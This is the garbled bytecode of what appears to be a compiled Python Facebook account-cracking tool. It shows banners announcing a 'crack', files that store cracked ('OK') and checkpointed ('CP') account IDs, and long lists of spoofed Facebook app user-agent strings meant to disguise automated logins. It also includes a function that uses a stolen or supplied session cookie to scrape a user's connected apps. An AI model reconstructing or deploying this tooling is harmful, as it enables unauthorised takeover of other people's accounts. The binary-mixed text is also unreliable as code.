�    I��dJm  �                   �^  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlmZ d dlZd dl	Z	d dlZd dlZd dlZd dlmZ d dlmZ 	 d dlZn# e$ r  e j        d�  �         Y nw xY w ej        �   �         Zg Zg ag ad ag Zg Zd� Zd� Zd� Z d	� Z!d� Z"dZ# ej$        dg�  �        Z%d� Z&d� Z'd� Z(d� Z)d� Z* G d� d�  �        Z+ ej,        d�  �        Z-dZ. ej/        �   �         j0        dd�         �1                    �   �         Z2	  e3dd�  �        �4                    �   �         Z5n?#   e3dd�  �        Z6e6�7                    e2e.z   �  �         e6�8                    �   �          Y nxY wd� Z9e:dk    r0 e j        d�  �         n#  Y nxY w e j        d�  �         n#  Y nxY w e+�   �         �;                    �   �          dS )�    N)�sleep)�ConnectionError)�ThreadPoolExecutorzpip install requestsc                  �.   � t          j        d�  �         d S �N�clear��os�system� �    �MRX.pyr   r      s   � ���7�����r   c                  �$   � t          d�  �         d S )Nu�   [1;33m──────────────────────────────────────────────────────��printr   r   r   �hackr   !   s)   � ��  v�  w�  w�  w�  w�  wr   c                 �$   � t          | �  �         d S �Nr   )�xs    r   �pr   #   s   � ��q�����r   c                  �L   � t          j        d�  �         t          d�  �         d S )Nr   u�      [1;33m ########  ##     ## ########          ##     ##  ##   ##  ##     ##         ##     ##   ## ##   ##     ##         ########     ###    ########          ##   ##     ## ##   ##   ##           ##    ##   ##   ##  ##    ##          ##     ## ##     ## ##     ##                                                                                                          [1;33m──────────────────────────────────────────────────────[1;31m[[1;37m*[1;31m]  [1;37mFACEBOOK [1;33m : [1;37m RXR TURAG[1;31m[[1;37m*[1;31m]  [1;37mGITHUB [1;33m   : [1;37m REVOLUTION-XR[1;31m[[1;37m*[1;31m]  [1;37mSTATUS [1;33m   : [1;32m TRIAL [1;31m[[1;37m*[1;31m]  [1;37mVERSION [1;33m  : [1;31m 0.1[1;33m──────────────────────────────────────────────────────�r   r   r   r   r   r   �bannerr   %   s3   � ��I�g����	� � � � � � r   c                  �L   � t          j        d�  �         t          d�  �         d S )Nr   u  [0;95m ███████        ██████ ██████   █████   ██████ ██   ██ ██            ██      ██   ██ ██   ██ ██      ██  ██   █████   █████ ██      ██████  ███████ ██      █████    ██            ██      ██   ██ ██   ██ ██      ██  ██   ██             ██████ ██   ██ ██   ██  ██████ ██   ██                                                                                                        [1;33m────────────────────────────────────────────────────── [1;31m[[1;32m✓[1;31m][1;32m YOUR CRACK STARTED........XXXXX [1;31m[[1;32m✓[1;31m][1;32m YOUR OK ID SAVED IN : [1;33m/sdcard/FLAME-OK.TXT [1;31m[[1;32m✓[1;31m][1;32m YOUR CP ID SAVED IN : [1;33m/sdcard/FLAME-CP.TXT [1;31m[[1;32m✓[1;31m][1;32m YOUR CRACK STOP PRSS CTRL THEN Z [1;33m──────────────────────────────────────────────────────r   r   r   r   �banner1r   7   s3   � ��I�g����	� � � � � � r   � c                 �  � t          j        �   �         }|�                    dddt          z   i��  �        j        }t          �                    |d�  �        }|�                    dd��  �        }d	� |�                    d�  �        D �   �         }	 t          t          |�  �        �  �        D ]=}t          dt          �dt          �||         �                    dd�  �        ���  �         �>n'# t          $ r t          dt           z  �  �         Y nw xY w|�                    dddt          z   i��  �        j        }t          �                    |d�  �        }|�                    dd��  �        }d� |�                    d�  �        D �   �         }	 t          t          |�  �        �  �        D ]6}t          dt          �d||         �                    dd�  �        ���  �         �7d S # t          $ r t          dt           z  �  �         Y d S w xY w)Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active�cookieznoscript=1;)�cookieszhtml.parser�form�post)�methodc                 �   � g | ]	}|j         ��S r   ��text��.0�is     r   �<listcomp>zcek_apk.<locals>.<listcomp>O   �   � �*�*�*�A���*�*�*r   �h3�z  [1;32m              ==> zDitambahkan padaz Ditambahkan padaz    %s[0m cookie invalidz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec                 �   � g | ]	}|j         ��S r   r$   r&   s     r   r)   zcek_apk.<locals>.<listcomp>X   r*   r   z  [1;31m              ==> �Kedaluwarsaz Kedaluwarsaz    %s [0mcookie invalid)�requests�Session�get�kukir%   �bs4�BeautifulSoup�find�find_all�range�lenr   �P�H�replace�AttributeError�M)r   �session�w�sopr   �gamer(   s          r   �cek_apkrB   J   s  � �������;�;�M�W_�`m�nr�`r�Vs�;�t�t�y������=�)�)���X�X�f�F�X�#�#��*�*����D�)�)�*�*�*��/���T����� r� r�a��5�A�A�A�a�a��Q����HZ�[n�8o�8o�8o�p�q�q�q�q�r��� /� /� /��	)�1�	-�.�.�.�.�.�/�����;�;�O�Ya�bo�pt�bt�Xu�;�v�v�{������=�)�)���X�X�f�F�X�#�#��*�*����D�)�)�*�*�*��/���T����� d� d�a��5�!�!�!�D��G�O�O�M�R`�4a�4a�4a�b�c�c�c�c�d� d��� /� /� /��	)�1�	-�.�.�.�.�.�.�/���s&   �AC' �'!D�D�AG �!H �?H c                  �  � t           j        } t           j        } | dd�  �        } |g d��  �        }d|� d|� d | dd�  �        � d	 | dd�  �        � d | dd�  �        � d | dd�  �        � d | dd�  �        � d|� d|� d�dz   |fS )N�   �   )��CPH2437�CPH2015�CPH2337�CPH1819�CPH2349�CPH2451�CPH2419�CPH1941�CPH2071�CPH2083�CPH2185�CPH2179�CPH2269�CPH2421�CPH2271�CPH2477�CPH2471�CPH1923�CPH1925�CPH1837�CPH2137�CPH1605�CPH1803�CPH1853�CPH1809�CPH1933�CPH2069�CPH2061�CPH2127�CPH2139�CPH2135�CPH2321�CPH2239�CPH2195�CPH2273�CPH2325�CPH2309�CPH2407�CPH1701�CPH2387�CPH1909�CPH1901�CPH1717�CPH1801�CPH2067�CPH2161�CPH2099�CPH2219�CPH2197�CPH2263�CPH2375�CPH1715�CPH2385�CPH2339�CPH2473�CPH2483�CPH2495�CPH1729�CPH1827�CPH1938�CPH1937�CPH2001�CPH2021�CPH2059�CPH2121�CPH2123�CPH2333�CPH2203�CPH2365�CPH1851�CPH1920�CPH1903�CPH1114�CPH1235�CPH1451�CPH1615�CPH1664�CPH1869�CPH1929�CPH1985�CPH2048�CPH2107�CPH2238�CPH2332�CPH2351�CPH2389�CPH2467�CPH2527�CPH2531�CPH2589�CPH2643�CPH3475�CPH3669�CPH3682�CPH3731�CPH3776�CPH3785�CPH4125�CPH4275�CPH4299�CPH4395�CPH4473�CPH4987�CPH5286�CPH5841�CPH5947�CPH6178�CPH6244�CPH6271�CPH6316�CPH6519�CPH6528�CPH6697�CPH7338�CPH7364�CPH7382�CPH7532�CPH7577�CPH7991�CPH8153�CPH8346�CPH8347�CPH8363�CPH8393�CPH8467�CPH8472�CPH8534�CPH8686�CPH8893�CPH9177�CPH9226�CPH9659�CPH9667�CPH9716�CPH9763�CPH9929�CPH1911�CPH1969�CPH2095�CPH2119�CPH2285�CPH2213�CPH2223�CPH2341�CPH2461�CPH2455�CPH1609�CPH1613�CPH1727�CPH1723�CPH1725�CPH1821�CPH1881�CPH1825�CPH1823�CPH1875�CPH1871�CPH2023�CPH2005�CPH2025�CPH2173�CPH2307�CPH2305�CPH2373�CPH1955�CPH1719�CPH1721�CPH1835�CPH1831�CPH1879�CPH1893�CPH1877�CPH1607�CPH1611�CPH1917�CPH1919�CPH1907�CPH1989�CPH1951�CPH1945�CPH2043�CPH2035�CPH2037�CPH2009�CPH2013�CPH2113�CPH2091�CPH2125�CPH2109�CPH2089�CPH2209�CPH2065�CPH2159�CPH2145�CPH2205�CPH2207�CPH2201�CPH2199�CPH2217�CPH1921�CPH2211�CPH2251�CPH2235�CPH2247�CPH2249�CPH2237�CPH2363�CPH2371�CPH2293�CPH2353�CPH2343�CPH2359�CPH2357�CPH2457�CPH2505�CPH2481�CPH1983�CPH1979z Dalvik/2.1.0 (Linux; U; Android �; z Build/RP1A.i� i z".011; wv) [FBAN/Orca-Android;FBAV/�o   i�  z.0.0.�   �c   �.i+  z(;FBPN/com.facebook.orca;FBLC/en_US;FBBV/i�k�i0��z&;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/z;FBSV/z;FBCA/armeabi-v7a:armeabi;FBDM/z4{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1)�random�randint�choice)�rr�rc�andro�merks       r   �user_agentr,  `   s�  � ��n��6�=�b�"�"�Q�r�(�(�%���  j%�  j%�  j%�  	k%�  	k%�� 	@�5�  	@�  	@�D�  	@�  	@�b�b��PV�FW�FW�  	@�  	@�{}�{}�  B�  CF�  |G�  |G�  	@�  	@�  NP�  NP�  QS�  TV�  NW�  NW�  	@�  	@�  Z\�  Z\�  ]`�  ad�  Ze�  Ze�  	@�  	@�  OQ�  OQ�  R[�  \e�  Of�  Of�  	@�  	@�  NR�  	@�  	@�  Z_�  	@�  	@�  	@�  Aw�  	w�  y}�  	}�  }r   c                  ��  � dd l } dd l}|j        } | j        dd��  �        �                    d�  �        �                    dd�  �        } | j        dd��  �        �                    d�  �        �                    dd�  �        } | j        d	d��  �        �                    d�  �        �                    dd�  �        }d|� d|� d|� d |dd�  �        � d |dd�  �        � d |dd�  �        � d�S )Nr   z getprop ro.build.version.releaseT)�shellzutf-8�r   zgetprop ro.product.modelzgetprop ro.build.idzMozilla/5.0 (Linux; Android r   z Build/z@; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/�Z   �m   z.0.iW  i�  r$  �2   �   z Mobile Safari/537.36)�subprocessr%  r&  �check_output�decoder;   )r4  r%  r(  �androidr+  �builds         r   �ua_pribadir9  f   s�  � ����������n��"�:�"�#E�D�Q�Q�Q�X�X�Y`�a�a�i�i�jn�oq�r�r����� :��F�F�F�M�M�g�V�V�^�^�_c�df�g�g��	 ��	 �!6�T�	B�	B�	B�	I�	I�'�	R�	R�	Z�	Z�[_�`b�	c�	c�� 	G�w�  	G�  	G�$�  	G�  	G�u�  	G�  	G�  GI�  GI�  JL�  MP�  GQ�  GQ�  	G�  	G�  VX�  VX�  Y]�  ^b�  Vc�  Vc�  	G�  	G�  fh�  fh�  ik�  lo�  fp�  fp�  	G�  	G�  	G�  Gr   c                  �h   � t          j        g d��  �        } d}t          j        g d��  �        |z   }|S )N��10_0_4�9_3_2�6_3_2�5_0_0�10_3_1�10_3_2�10_3_3z�[FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/Samsung.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=473,height=1157};])a  Mozilla/5.0 (Linux; Android 4.2.3.0.0; SM-555 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=635,height=1530};]a'  Mozilla/5.0 (Linux; Android 8.3.1.0.0; SM-290 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix;FBSV/Infinix.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=929,height=1076};]a'  Mozilla/5.0 (Linux; Android 7.2.2.0.0; SM-366 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/Samsung.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=473,height=1157};]a  Mozilla/5.0 (Linux; Android 5.3.4.0.0; SM-610 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo;FBSV/Oppo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=559,height=1668};]a'  Mozilla/5.0 (Linux; Android 6.3.0.0.0; SM-107 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/Samsung.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=842,height=1127};]a  Mozilla/5.0 (Linux; Android 8.4.3.0.0; SM-884 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=861,height=1264};]a  Mozilla/5.0 (Linux; Android 4.0.3.0.0; SM-838 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo;FBSV/Oppo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=468,height=480};]a  Mozilla/5.0 (Linux; Android 6.2.3.0.0; SM-649 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Vivo;FBBD/Vivo;FBDV/Vivo;FBSV/Vivo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1058,height=940};]a#  Mozilla/5.0 (Linux; Android 5.0.4.0.0; SM-578 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Lenovo;FBBD/Lenovo;FBDV/Lenovo;FBSV/Lenovo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=396,height=1382};]a'  Mozilla/5.0 (Linux; Android 10.1.3.0.0; SM-262 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix;FBSV/Infinix.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=909,height=513};]a"  Mozilla/5.0 (Linux; Android 9.4.3.0.0; SM-801 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Lenovo;FBBD/Lenovo;FBDV/Lenovo;FBSV/Lenovo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=332,height=569};]a  Mozilla/5.0 (Linux; Android 7.1.2.0.0; SM-817 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo;FBSV/Oppo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=601,height=1272};]a#  Mozilla/5.0 (Linux; Android 8.0.2.0.0; SM-958 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Huawei;FBBD/Huawei;FBDV/Huawei;FBSV/Huawei.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=664,height=1254};]a'  Mozilla/5.0 (Linux; Android 7.2.4.0.0; SM-458 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix;FBSV/Infinix.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1034,height=662};]a#  Mozilla/5.0 (Linux; Android 4.4.3.0.0; SM-316 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Lenovo;FBBD/Lenovo;FBDV/Lenovo;FBSV/Lenovo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=761,height=1632};]a  Mozilla/5.0 (Linux; Android 9.4.1.0.0; SM-670 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Vivo;FBBD/Vivo;FBDV/Vivo;FBSV/Vivo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=412,height=1847};]a  Mozilla/5.0 (Linux; Android 5.1.1.0.0; SM-876 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=532,height=948};]a#  Mozilla/5.0 (Linux; Android 7.2.2.0.0; SM-873 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Lenovo;FBBD/Lenovo;FBDV/Lenovo;FBSV/Lenovo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=838,height=1172};]a  Mozilla/5.0 (Linux; Android 4.4.3.0.0; SM-836 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=665,height=774};]a  Mozilla/5.0 (Linux; Android 5.3.3.0.0; SM-290 Build/8BFOHT) [FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;com.facebook.Mlite;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo;FBSV/Oppo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=893,height=1331};]�r%  r'  ��android_version�END�uas      r   �iAmAndroidUarH  n   s_   � ��=�!^�!^�!^�_�_�� u���m�  ^[�  ^[�  ^[�  _[�  _[�  `[c[�  c[���r   c                  �b   � t          j        g d��  �        } d}t          j        g d��  �        }|S )Nr;  z�[FBAN/FB4A;FBAV/415.0.0.34.107;FBPN/com.facebook.katana;FBLC/en_US;FBBV/442016421;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo;FBSV/Oppo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=620,height=1746};])dzBDalvik/2.1.0 (Linux; U; Android 5.1; JALA.V158F3P.E6 Build/LMY47D)zNDalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-20)zADalvik/2.1.0 (Linux; U; Android 9; AT_SmartScreen Build/RTK2851P)zRDalvik/2.1.0 (Linux; U; Android 12; motorola edge (2021) Build/S1RMS32.68-43-16-9)z?Dalvik/2.1.0 (Linux; U; Android 5.0.2; ASUS_Z011D Build/LRX22G)zDDalvik/2.1.0 (Linux; U; Android 12; 100071483 Build/SP1A.210812.016)z@Dalvik/2.1.0 (Linux; U; Android 11; 9296Q Build/RKQ1.210107.001)z@Dalvik/2.1.0 (Linux; U; Android 9; T10LTE Build/PPR1.180610.011)z;Dalvik/2.1.0 (Linux; U; Android 8.1.0; YMP-A1 Build/O11019)zTDalvik/2.1.0 (Linux; U; Android 12.0; uis8581a2h10_Automotive Build/QP1A.190711.020)zHDalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-85-4-2)z8Dalvik/2.1.0 (Linux; U; Android 8.1.0; S22 Build/O11019)zVDalvik/2.1.0 (Linux; U; Android 9; SM-T515 Build/PPR1.180610.011) AppleWebKit [PB/107]zJDalvik/2.1.0 (Linux; U; Android 9; SM-J415FN Build/PPR1.180610.011) VD/235zBDalvik/2.1.0 (Linux; U; Android 13; CPH2305 Build/SKQ1.221119.001)z@Dalvik/2.1.0 (Linux; U; Android 13; V2040 Build/TP1A.220624.014)zCDalvik/2.1.0 (Linux; U; Android 13; SM-S9160 Build/TP1A.220624.014)zEDalvik/2.1.0 (Linux; U; Android 12; M2010J19SL Build/SKQ1.211202.001)z;Dalvik/2.1.0 (Linux; U; Android 6.0; ALFA_8MB Build/MRA58K)zEDalvik/2.1.0 (Linux; U; Android 12; 22127PC95I Build/SP1A.210812.016)zDDalvik/2.1.0 (Linux; U; Android 12; ZTE A7050 Build/SP1A.210812.016)zLDalvik/2.1.0 (Linux; U; Android 12; moto g 5G (2022) Build/S1SAS32.47-59-19)zFDalvik/1.6.0 (Linux; U; Android 4.4.2; LG-LS995 Build/KOT49I.LS995ZVB)zADalvik/2.1.0 (Linux; U; Android 9; moto e6s Build/POE29.288-46-6)zBDalvik/2.1.0 (Linux; U; Android 11; AI PONT Build/RTM3.211215.274)z?Dalvik/2.1.0 (Linux; U; Android 9; kukui Build/R113-15393.58.0)z?Dalvik/1.6.0 (Linux; U; Android 4.4.2; reederA7iC Build/KOT49H)z>Dalvik/2.1.0 (Linux; U; Android 11; T6L Build/RP1A.201005.001)z8Dalvik/2.1.0 (Linux; U; Android 12.0; PG11 Build/NRD90M)zQDalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-25-15-15)z@Dalvik/2.1.0 (Linux; U; Android 13; V2025 Build/TP1A.220624.014)z>Dalvik/2.1.0 (Linux; U; Android 8.1.0; 5008D_EEA Build/O11019)zJDalvik/2.1.0 (Linux; U; Android 6.0; Optima 8002 3G TS8001PG Build/MRA58K)zBDalvik/2.1.0 (Linux; U; Android 6.0; Lenovo TB3-730F Build/MRA58K)z?Dalvik/2.1.0 (Linux; U; Android 11; p281 Build/RD2A.211001.002)zADalvik/2.1.0 (Linux; U; Android 13; LE2110 Build/TP1A.220905.001)zADalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R113-15393.58.0)zbDalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook 15 (CB515-1H, CB515-1HT) Build/R113-15393.58.0)z>Dalvik/2.1.0 (Linux; U; Android 10; S14 Build/QP1A.190711.020)zBDalvik/2.1.0 (Linux; U; Android 11; octopus Build/R113-15393.58.0)zDDalvik/2.1.0 (Linux; U; Android 9; AIWA 2K TV Build/PTO7.200805.001)z>Dalvik/2.1.0 (Linux; U; Android 13; P80 Build/TP1A.220624.014)zCDalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042)z>Dalvik/2.1.0 (Linux; U; Android 12; M53 Build/SP1A.210812.016)zXDalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) AppleWebKit [PB/107]zRDalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002) VD/235zBDalvik/2.1.0 (Linux; U; Android 12; SmartTV Build/SP1A.210812.015)zRDalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RAS33.55-15-10-1)zBDalvik/2.1.0 (Linux; U; Android 10; OTT2100 Build/QP1A.191105.004)zADalvik/2.1.0 (Linux; U; Android 12; A201OP Build/SKQ1.220303.001)zEDalvik/2.1.0 (Linux; U; Android 12; M1582C_MAX Build/SP1A.210812.016)z@Dalvik/2.1.0 (Linux; U; Android 10; ONEtv Build/QTG1.220808.001)zFDalvik/2.1.0 (Linux; U; Android 8.1.0; LM-Q925S Build/OPM1.171019.026)zGDalvik/2.1.0 (Linux; U; Android 11; TPC-G1011LTE Build/RP1A.201005.001)z;Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris50 Build/O11019)zEDalvik/2.1.0 (Linux; U; Android 13; 2303ERA42L Build/TP1A.220624.014)zADalvik/1.6.0 (Linux; U; Android 4.4.2; TURKCELL T50 Build/KVT49L)zSDalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-64-11)z;Dalvik/2.1.0 (Linux; U; Android 10.0; X96MINI Build/NHG47L)zKDalvik/2.1.0 (Linux; Android 7.1.2; vivo X9s L Build/3cbyn; wv) AppleWebKitzBDalvik/2.1.0 (Linux; U; Android 12; TB310FU Build/SP1A.210812.016)zGDalvik/2.1.0 (Linux; Android 7.1.2; PAAM00 Build/31wbo; wv) AppleWebKitz?Dalvik/2.1.0 (Linux; U; Android 9; grunt Build/R113-15393.58.0)zIDalvik/2.1.0 (Linux; Android 7.1.2; ARE-AL10 Build/v7ne3; wv) AppleWebKitzCDalvik/2.1.0 (Linux; Android 7.1.2; 4G Build/5tqfr; wv) AppleWebKitz@Dalvik/2.1.0 (Linux; U; Android 13; V2135 Build/TP1A.220624.014)z?Dalvik/2.1.0 (Linux; U; Android 9; grunt Build/R113-15393.48.0)z@Dalvik/2.1.0 (Linux; U; Android 12; STAR5 Build/SP1A.210812.016)z;Dalvik/2.1.0 (Linux; U; Android 10.0; P43 Pro Build/LMY47I)zHDalvik/2.1.0 (Linux; U; Android 12; moto g(50) Build/S1RFS32.27-25-11-9)z@Dalvik/2.1.0 (Linux; U; Android 11; GS290 Build/RQ3A.211001.001)zIDalvik/2.1.0 (Linux; U; Android 9; Orange Neva jet Build/PKQ1.190519.001)zYDalvik/2.1.0 (Linux; U; Android 11; M2006C3MG Build/RP1A.200720.011) AppleWebKit [PB/107]zEDalvik/2.1.0 (Linux; U; Android 13; 22031116BG Build/TP1A.220624.014)zBDalvik/2.1.0 (Linux; U; Android 13; RMX3301 Build/SKQ1.221119.001)z>Dalvik/2.1.0 (Linux; U; Android 11; L4T Build/RP1A.201005.001)zFDalvik/2.1.0 (Linux; U; Android 7.1.1; MeMOPAD 10FHD LTE Build/NMF26O)zBDalvik/2.1.0 (Linux; U; Android 11; G91 Max Build/RP1A.200720.011)zEDalvik/2.1.0 (Linux; U; Android 13.0; SM-G996B Build/PPR1.180610.011)z?Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC72 Build/61.2.A.0.447)z:Dalvik/2.1.0 (Linux; U; Android 7.1.2; TB718 Build/NHG47K)zBDalvik/2.1.0 (Linux; U; Android 13; OPD2203 Build/SP1A.210812.016)z=Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-V607L Build/LRX22G)zGDalvik/2.1.0 (Linux; U; Android 12; RC609L Build/ORB609L_V1.3.0_BTM-ST)z7Dalvik/2.1.0 (Linux; U; Android 12; A201SH Build/S0020)zHDalvik/2.1.0 (Linux; U; Android 11; Infinix X663D Build/RP1A.200720.011)zQDalvik/2.1.0 (Linux; U; Android 10; moto g(7) play Build/QPYS30.95-Q3-10-62-3-22)zFDalvik/2.1.0 (Linux; U; Android 9; AQUOS_TVE19A Build/PTMW.190511.139)z;Dalvik/2.1.0 (Linux; U; Android 10.0; Note10+ Build/LMY47I)zCDalvik/2.1.0 (Linux; U; Android 13; SM-M546B Build/TP1A.220624.014)z?Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTEAMR311 Build/NS6296)z@Dalvik/2.1.0 (Linux; U; Android 12; H4113 Build/SQ3A.220705.004)zDDalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOWS32.121-40-2)z:Dalvik/2.1.0 (Linux; U; Android 7.1.2; AEOCW Build/NS6505)z>Dalvik/2.1.0 (Linux; U; Android 12; X55 Build/SP1A.210812.016)zGDalvik/1.4.0 (Linux; U; Android 2.3.5; HTC Desire HD A9191 Build/GRJ90)zKDalvik/2.1.0 (Linux; U; Android 11; M2004J19C Build/RP1A.200720.011) VD/235zJDalvik/2.1.0 (Linux; U; Android 11; SM-A037G Build/RP1A.200720.012) VD/221zJDalvik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) VD/235zHDalvik/2.1.0 (Linux; U; Android 9; CPH2015 Build/PPR1.180610.011) VD/235rC  rD  s      r   �iAmAndroidUa2rJ  t   sO   � ��=�!^�!^�!^�_�_�� V���m�  co�  co�  co�  do�  do���r   c                   �>   � e Zd Zd� Zd� Zd� Zd� Zd� Zd� Zd� Z	d� Zd	S )�Mainc                 �.   � t          j        d�  �         d S r   r	   )�selfs    r   �__init__zMain.__init__{   s   � ��)�G�����r   c                 �D  � t          |�  �        dk    st          |�  �        dk    ryt          d�  �         t          �   �          t          dt          |�  �        z  �  �         t          dt          |�  �        z  �  �         t          �   �          t	          �   �          d S d S )Nr   r/  zSUCCESSFUL : %s zCHECKPOINT : %s )r8   r   r   r   �exit)rN  �ok�cps      r   �saved_resultszMain.saved_results}   s�   � ���W�W��\�\�S��W�W��\�\��T�7�7�7��6�6�6��	�c�"�g�g�	&�'�'�'��	�c�"�g�g�	&�'�'�'��6�6�6��7�7�7�7�7� "�\r   c                 ��  � t          �   �          t          �   �          t          d�  �         t          �   �          t          d�  �        }|dk    r| �                    �   �          d S |dk    r*t          j        d�  �         | �                    �   �          d S |dk    rt          j        d�  �         d S t          d�  �         t          d	�  �         | �                    �   �          d S )Nz[1] START CRACKz([1;91m[[1;92m*[1;91m][1;92m 